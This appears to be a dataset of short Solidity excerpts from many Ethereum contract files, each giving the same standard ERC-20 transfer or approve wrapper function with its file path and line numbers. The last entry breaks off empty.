<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="76" endline="79" pcid="8290">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="70" endline="73" pcid="4134">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="82" endline="85" pcid="7299">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="69" endline="72" pcid="7990">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="85" endline="88" pcid="7237">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="85" endline="88" pcid="4004">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="86" endline="89" pcid="8292">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="84" endline="87" pcid="2738">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="74" endline="77" pcid="1446">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="74" endline="77" pcid="4676">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="75" endline="78" pcid="2249">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="84" endline="87" pcid="807">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="74" endline="77" pcid="3104">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="75" endline="78" pcid="8723">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="84" endline="87" pcid="7716">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="80" endline="83" pcid="6988">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="70" endline="73" pcid="6986">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="70" endline="73" pcid="4303">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="73" endline="76" pcid="8798">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="69" endline="72" pcid="8035">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="145" endline="148" pcid="4169">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="84" endline="87" pcid="3600">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="75" endline="78" pcid="7235">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="84" endline="87" pcid="2098">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="73" endline="76" pcid="5941">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="78" endline="81" pcid="5005">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="74" endline="77" pcid="805">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="80" endline="83" pcid="4305">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="70" endline="73" pcid="8992">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="79" endline="82" pcid="8037">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="73" endline="76" pcid="3074">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="69" endline="72" pcid="3790">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="82" endline="85" pcid="9162">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="80" endline="83" pcid="8994">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="73" endline="76" pcid="2962">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="83" endline="86" pcid="8217">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="84" endline="87" pcid="6973">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="76" endline="79" pcid="3621">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="70" endline="73" pcid="2992">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="86" endline="89" pcid="3623">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="84" endline="87" pcid="4678">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="79" endline="82" pcid="899">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="74" endline="77" pcid="2096">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="71" endline="74" pcid="835">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="68" endline="71" pcid="5003">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="73" endline="76" pcid="2017">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="80" endline="83" pcid="3327">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="74" endline="77" pcid="3442">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="84" endline="87" pcid="7490">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="71" endline="74" pcid="5660">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="81" endline="84" pcid="5662">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="74" endline="77" pcid="6971">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="85" endline="88" pcid="451">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="74" endline="77" pcid="3598">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="84" endline="87" pcid="7520">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="85" endline="88" pcid="993">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="77" endline="80" pcid="2723">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="74" endline="77" pcid="4226">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="74" endline="77" pcid="3487">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="81" endline="84" pcid="536">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="84" endline="87" pcid="1849">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="69" endline="72" pcid="5675">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="82" endline="85" pcid="1224">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="46" endline="49" pcid="2475">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="74" endline="77" pcid="8305">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="74" endline="77" pcid="7518">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="77" endline="80" pcid="978">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF8cde3CAf78d43cF6e15181858c0923027B24cDd.sol" startline="71" endline="74" pcid="9059">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="81" endline="84" pcid="3136">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="74" endline="77" pcid="346">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x71D87A7100c195679C7731039d37EFBfF1c19e6a.sol" startline="174" endline="177" pcid="4174">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="84" endline="87" pcid="6232">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="71" endline="74" pcid="4692">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="70" endline="73" pcid="7312">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="80" endline="83" pcid="7314">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="73" endline="76" pcid="942">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="60" endline="63" pcid="4122">
    function approve(address spender, uint256 amount) public returns (bool){
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="74" endline="77" pcid="6230">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="83" endline="86" pcid="3241">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="79" endline="82" pcid="5677">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="72" endline="75" pcid="4017">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="81" endline="84" pcid="4694">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="74" endline="77" pcid="1847">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x705418103a3623918d0f718465dacbfd4c30df74.sol" startline="51" endline="54" pcid="4120">
    function transfer(address recipient, uint256 amount)public returns (bool){
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="84" endline="87" pcid="6217">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="700" endline="703" pcid="2217">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="84" endline="87" pcid="4228">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="74" endline="77" pcid="6215">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="82" endline="85" pcid="2646">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="81" endline="84" pcid="8337">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="84" endline="87" pcid="7386">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="74" endline="77" pcid="3870">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="88" endline="91" pcid="2528">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="84" endline="87" pcid="6958">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="74" endline="77" pcid="1245">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="86" endline="89" pcid="6202">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="74" endline="77" pcid="6956">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1514" endline="1517" pcid="317">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="84" endline="87" pcid="8307">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="74" endline="77" pcid="4707">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="71" endline="74" pcid="4318">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="77" endline="80" pcid="404">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="78" endline="81" pcid="7219">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="80" endline="83" pcid="2994">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="82" endline="85" pcid="3715">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="70" endline="73" pcid="1965">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="73" endline="76" pcid="3239">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x681cc758d8f73Aee9cA926845b46FAc425a9f131.sol" startline="84" endline="87" pcid="3872">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="80" endline="83" pcid="1967">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="76" endline="79" pcid="6200">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="80" endline="83" pcid="9210">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="84" endline="87" pcid="4709">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="72" endline="75" pcid="7327">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="74" endline="77" pcid="1371">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="68" endline="71" pcid="7217">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="81" endline="84" pcid="5882">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="83" endline="86" pcid="944">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="84" endline="87" pcid="2629">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="71" endline="74" pcid="3224">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="84" endline="87" pcid="1247">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="71" endline="74" pcid="8335">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="82" endline="85" pcid="2870">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="70" endline="73" pcid="3805">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="69" endline="72" pcid="4032">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="85" endline="88" pcid="7947">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="85" endline="88" pcid="8725">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="80" endline="83" pcid="2347">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="81" endline="84" pcid="4320">
